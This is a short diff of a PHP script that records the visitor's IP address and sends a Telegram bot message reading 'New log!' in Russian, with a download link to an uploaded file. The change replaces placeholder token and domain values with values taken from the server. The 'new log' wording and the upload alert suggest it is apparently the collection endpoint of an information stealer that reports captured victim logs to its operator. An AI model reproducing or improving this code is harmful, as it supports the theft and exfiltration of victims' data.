@@ -21,13 +21,13 @@ function GetIP() {
 
 $ip = GetIP();
 
-define('TELEGRAM_TOKEN', 'xxxxx:XXXXXXXXXXXXXXX');
+define('TELEGRAM_TOKEN', 'token');
 
-define('TELEGRAM_CHATID', 'YourID');
+define('TELEGRAM_CHATID', 'yourid');
 
 message_to_telegram('Новый лог!
 IP: ' .  $ip . '
-Скачать: YourDomain/' . $uploadfile);
+Скачать: ' . $_SERVER['HTTP_HOST'] . '/' . $uploadfile);
 
 function message_to_telegram($text) {
     $ch = curl_init();
